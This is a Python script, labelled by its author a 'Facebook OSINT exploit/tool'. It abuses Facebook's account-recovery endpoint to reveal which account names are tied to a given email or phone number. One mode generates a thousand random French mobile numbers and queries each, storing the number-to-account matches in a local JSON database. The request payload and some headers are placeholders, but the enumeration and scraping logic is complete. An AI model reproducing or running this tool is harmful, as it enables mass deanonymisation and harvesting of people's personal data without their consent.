"""
MIT License

Copyright (c) 2023 FH.Dev

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import json
import random
import requests
from bs4 import BeautifulSoup
import asyncio
import argparse
import datetime

def saveData(info, username):
    current_datetime = datetime.datetime.now()
    current_date = current_datetime.strftime("%d/%m/%Y")
    new_data = {"data": info, "username": username, "saveDate": current_date}
    with open("data.json", 'r') as file:
        data = json.load(file)
    index_to_replace = None
    for i, entry in enumerate(data):
        if entry["data"] == new_data["data"]:
            index_to_replace = i
            break
    if index_to_replace is not None:
        data[index_to_replace] = new_data
    else:
        data.append(new_data)
    with open("data.json", 'w') as file:
        json.dump(data, file, indent=2)

async def info(email):
    url = "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover"
    headers = {'X-Fb-Lsd': 'COMPLETE-WITH-X-FB-LSD','X-Asbd-Id': 'COMPLETE-WITH-X-ASBD-ID','Host': 'www.facebook.com','Sec-Ch-Ua': '','Content-Type': 'application/x-www-form-urlencoded','Sec-Ch-Ua-Mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36','Sec-Ch-Ua-Platform': '""','Accept': '*/*','Origin': 'https://www.facebook.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US,en;q=0.9'}
    payload = f"PASTE YOUR PAYLOAD IN HERE AND REPLACE THE VALUE YOU WROTE WITH "{str(email)}""
    response = requests.request("POST", url, data=payload, headers=headers)

    if response.text[1198:1238] == "Please try again with other information." or response.text[1198:1238] == " Please try again with other information.":
        print('No account were found linked to these informations.')
    else:
        data = json.loads(response.text[9:])
        if "domops" in data:
            usernames = []
            if "payload" in data:
                payload_html = data["domops"][0][3]["__html"]
                soup = BeautifulSoup(payload_html, 'html.parser')
                user_divs = soup.find_all('div', class_='_9o4d')
                for user_div in user_divs:
                    username = user_div.text.strip()
                    usernames.append(username)
                if str(usernames)[1:-1] != "":
                    saveData(email, usernames)
                    print(f"{email} -> {str(usernames)[1:-1]}")
                else:
                    saveData(email, "")
                    print(f"{email} -> Error")
        else:
            url2 = "https://www.facebook.com/login/web/?email=" + str(email) + "&is_from_lara=1"
            response2 = requests.request("GET", url2, headers={"Cookie": response.headers.get('Set-Cookie')})
            soup2 = BeautifulSoup(response2.text, 'html.parser')
            try :
                span_element = soup2.find('div', class_='_2phz').find('span', class_='_50f6')
                username = span_element.get_text().replace('Se connecter en tant que ', '')
                saveData(email, username)
                print(f"{email} -> '{username}'")
            except AttributeError:
                saveData(email, "")
                print(f"{email} -> Error")


async def lookup(username):
    with open("data.json", 'r') as file:
        data = json.load(file)
    found = False
    for entry in data:
        usernames = entry.get("username")
        if isinstance(usernames, str):
            if usernames == username:
                print(f"Data for {username}: {entry.get('data')}")
                found = True
        elif isinstance(usernames, list):
            if username in usernames:
                print(f"Data for {username}: {entry.get('data')}")
                found = True
    if not found:
        print(f"No data found for '{username}' in database.")


async def expend():
    def generate_random_number():
        return "06" + str(random.randint(10000000, 99999999))
    def is_unique(number, existing_numbers, current_list):
        return number not in existing_numbers and number not in current_list
    with open("data.json", "r") as data_file:
        existing_data = json.load(data_file)
    existing_numbers = set(item["data"] for item in existing_data)
    number_list = []
    while len(number_list) < 1000:
        new_number = generate_random_number()
        if is_unique(new_number, existing_numbers, number_list):
            number_list.append(new_number)
    while number_list:
        data = number_list[0]
        await info(data)
        number_list.pop(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Facebook OSINT exploit/tool")
    parser.add_argument("-e", action="store_true", help="extend DB")
    parser.add_argument("-i", "--info", metavar="", help="get username from email/phone on facebook")
    parser.add_argument("-l", "--username", metavar="", help="lookup a username in DB")
    args = parser.parse_args()

    loop = asyncio.get_event_loop()

    if args.info:
        loop.run_until_complete(info(args.info))
    elif args.username:
        loop.run_until_complete(lookup(args.username))
    elif args.e:
        loop.run_until_complete(expend())
    else:
        parser.print_help()
